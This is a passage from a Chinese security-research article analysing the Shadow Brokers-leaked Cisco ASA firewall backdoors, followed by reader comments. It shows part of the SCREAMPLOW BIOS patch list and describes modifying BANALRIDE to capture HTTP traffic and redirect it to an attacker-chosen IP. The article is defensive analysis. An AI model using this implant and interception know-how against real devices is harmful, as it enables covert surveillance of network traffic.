&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;address&gt;fffec480&lt;/address&gt;&nbsp;&lt;!--&nbsp;SECOND_CODE_AREA_ADDRESS&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/patch&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;patch&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;data&nbsp;src=&quot;file&quot;&gt;bin/asa5505/SCP28/asa5505_patchE18BF.bin&lt;/data&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;address&gt;fffe18bf&lt;/address&gt;&nbsp;&lt;!--&nbsp;HOOK_ADDRESS&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/patch&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/patchList&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/version&gt;
&lt;/platform&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此XML文件描述了SCREAMPLOW后门感染目标ROMMON版本为1.0(12)6的Cisco ASA 5505型号设备，而感染前的原始BIOS镜像文件存放在bin/asa5505/asa5505_10126_bios_sectors1-E_clean.bin，通过此XML文件可大致了解后门植入ASA 的BIOS内存中的代码区域，如下图所示：</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01944e973e33479c89.png" title="t0132ac65089604e889.png" alt="http://p2.qhimg.com/t0132ac65089604e889.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">SCREAMPLOW后门通过感染BIOS进程空间实现持久化，由于Cisco ASA设备在执行reload命令后内存中的BIOS代码并没有重新从文件中载入，因此通过reload重启的方式并无法彻底清除此后门。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x05 通过BANALRIDE实现监听流量后门</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">对于网络设备后门攻击来说，实现流量监听和重定向是十分重要的环节，其中BANANAGLEE作为最核心的后门模块提供相关功能接口，但由于BANANAGLEE载荷缺失，并不能对其进行实际研究测试，但我们发现当前泄漏出来的BANALRIDE后门已经具备了BG的大部分网络后门功能，可以理解其是一个内存小马，BG是一个内存大马，若适当修改BANALRIDE中的部分代码实现完整的流量监听和重定向功能，便实现后门攻击的核心功能，以下示例中我们重现了通过BANALRIDE实现对HTTP报文的流量监听并将其重定向输出到设备文件中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">由于BANALRIDE后门劫持了ASA设备底层网络的所有流量，因此完全可以设置过滤规则并从中筛选出感兴趣数据，例如可以监听流经ASA物理网口上所有HTTP报文，并通过文件输出函数sub_8074498将报文输出到文本中，结果如下图所示：</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t011ec5fc7214c3a72c.png" title="t012fecc8de8fe33fce.png" alt="http://p5.qhimg.com/t012fecc8de8fe33fce.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以充分发挥想象力，配合上一节所提到的lina中数据包发送功能函数将己截获的数据流量镜像发送到攻击者指定的IP上去，即实现流量重定向功能。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">360MeshFire团队ASA设备后门Demo演示：&nbsp;</span></p><p style="text-align: center;"><iframe class="iframe_auto_size" src="http://player.youku.com/embed/XMTg0MzkxNzQ5Ng==" frameborder="0"></iframe></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">0x06结论</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">针对此次对Cisco ASA防火墙后门的深入分析，可以看出针对网络基础设施的攻击程序已经达到了相对较高的工程化实现，并实现了全平台多版本的适配，从研发和植入成本看需要具备相对较高的技术门槛。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1．ASA系统底层是Linux系统，但是无法通过传统Linux系统方式进行渗透。ASA设备网络通信使用的数据通信接口都是由lina进程驱动的，对所有网络报文的处理也通过lina程序来实现，底层Linux系统并不能识别ASA数据平面的网络接口，因此在整个后门代码中无法使用任何Linux系统调用包括socket程序来实现后门的核心网络功能，后门所有行为，包括加解密、内存管理、网络通讯等，都是复用了ASA主进程lina中函数指针。BANALRIDE通过劫持监听ASA系统中所有流量并从中过滤出控制命令。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2．通过对代码中调用函数进行分析，可以推测出后门研发组织对于ASA系统以及内部函数调用功能非常熟悉。我们发现在IDA中逆向的ASA系统中总包含近有四万个函数，且每个版本系统的函数地址都存在差异性，若仅通过逆向的方式来从中获取攻击过程中所需函数其工作量是巨大的，不排除后门研发组织对于ASA系统有更为充分的技术资料支持其研发。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3．ASA设备植入的后门具备非常高的隐蔽性。首先，该后门植入并没有在网络设备上开放任何TCP或UDP的网络监听端口，完全依靠ASA底层的网络接收函数来监听所有物理端口上的通信流量，并过滤出连接指令，无法通过网络探测的方式进行后门发现。此外，后门连接采用自定义网络协议，采用D-H算法协商密钥验证后才允许连接，通讯的过程也采用协商的密钥进行了加密，难以通过传统IDS或IPS检测攻击。因此，如果想准确的检测后门，必须按照后门通信协议构造网络数据包并获取真实后门的反馈才能够实现后门的探测。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4．ASA设备植入的后门的具备工程化和专业化。从泄露的文件目录看，后门研发组织对于网络基础设备拥有全平台的适配能力和模块化后门加载能力，整个后门攻击程序可以作为网络基础设施攻击框架，只需要挖掘到新的0DAY漏洞就可以方便的扩展沿用现有的攻击载荷，文件中包含多个针对网络设备的后门程序，这些程序拥有Rootkit能力，且具备加密和抗分析能力。尤其当攻击目标定向为不便重启和升级的基础网络设施时，其持久化后门即使升级后仍可能无法彻底清除，这对于安全防御和检测方是很大的挑战，针对网络设备固件完整性校验、网络设备内存完整性校验、以及固件的供应链安全将显得越发重要。 </span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">传送门</span></strong></span></p><hr style="white-space: normal;"/><p style="white-space: normal; text-indent: 2em;"><a href="http://bobao.360.cn/learning/detail/3053.html" target="_blank" style="text-decoration: none;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">揭开思科ASA防火墙网络军火的面纱（上）</span></strong><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></a></p><p style="text-indent: 2em; text-align: left;"><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3248.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="揭开思科ASA防火墙网络军火的面纱（下）Shadow Brokers 泄露后门完整分析 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3248" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="6584" user-name="安全客官方微博" href="javascript:;">
                安全客官方微博            </a>
                        <span class="comment-time">2016-12-05 12:52:01</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="6584">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_6584" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">文章超棒！欢迎小伙伴们转发扩散</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t01857c1978f2c4da10.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="390662405" class="response" data-bind-id="390662405" data-target="6583" user-name="聪明的狗子" href="javascript:;">
                聪明的狗子            </a>
                        <span class="comment-time">2016-12-05 11:57:44</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="390662405" data-target="6583">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_6583" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">是的，文章很赞哦</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
<div class="clearfix re-comment">
    <div class="comment-quote">  
        <div class="comment-user">
            <a href="javascript:;" class="response" data-bind-id="0" data-target="6509">张凯-i春秋</a> <span class="comment-time">2016-12-01 13:41:14</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="6509">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_6509" data-type="comment">点赞</a></span>            </div>
            <p>防火墙和路由设备的漏洞威力巨大</p>
        </div>
    </div>
        </div>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/8x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="6562" user-name="fancery" href="javascript:;">
                fancery            </a>
                        <span class="comment-time">2016-12-02 18:30:48</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="6562">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_6562" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">360MeshFire Team揭秘网络设备漏洞后门第二弹，方程式泄露思科ASA设备后门完整分析和植入演示，全球首发</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t017cb0908df3b5c8ec.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="77499567" class="response" data-bind-id="77499567" data-target="6540" user-name="FredPay" href="javascript:;">
                FredPay            </a>
                        <span class="comment-time">2016-12-02 08:50:23</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="77499567" data-target="6540">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_6540" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">网络设备的安全，由于系统较封闭，接触人员少，所以这方面的研究感觉还是比较少。
但是这个关键设备的安全性，是否如厂商所说的那样呢？
这一领域需要更多的精力去研究。</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/4x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="6539" user-name="Thanks-for-Sharing" href="javascript:;">
                Thanks-for-Sharing            </a>
                        <span class="comment-time">2016-12-02 03:00:34</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="6539">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_6539" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">轉發微博</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/8x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="2798874539" class="response" data-bind-id="2798874539" data-target="6537" user-name="360U2798874539" href="javascript:;">
                360U2798874539            </a>
                        <span class="comment-time">2016-12-01 23:45:11</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="2798874539" data-target="6537">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_6537" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">@有道云</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/6x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="6520" user-name="K13笔记" href="javascript:;">
                K13笔记            </a>
                        <span class="comment-time">2016-12-01 17:10:40</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="6520">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_6520" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">轉發微博</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/10x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="2782911444" class="response" data-bind-id="2782911444" data-target="6514" user-name="大表哥" href="javascript:;">
                大表哥            </a>
                        <span class="comment-time">2016-12-01 15:13:13</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="2782911444" data-target="6514">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_6514" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">防火墙和路由设备的漏洞威力巨大</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/6x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="6513" user-name="NickJchn" href="javascript:;">
                NickJchn            </a>
                        <span class="comment-time">2016-12-01 15:01:12</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="6513">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_6513" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">@有道云笔记收藏</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/2x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="6509" user-name="张凯-i春秋" href="javascript:;">
                张凯-i春秋            </a>
                        <span class="comment-time">2016-12-01 13:41:14</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="6509">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_6509" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">防火墙和路由设备的漏洞威力巨大</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3248" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
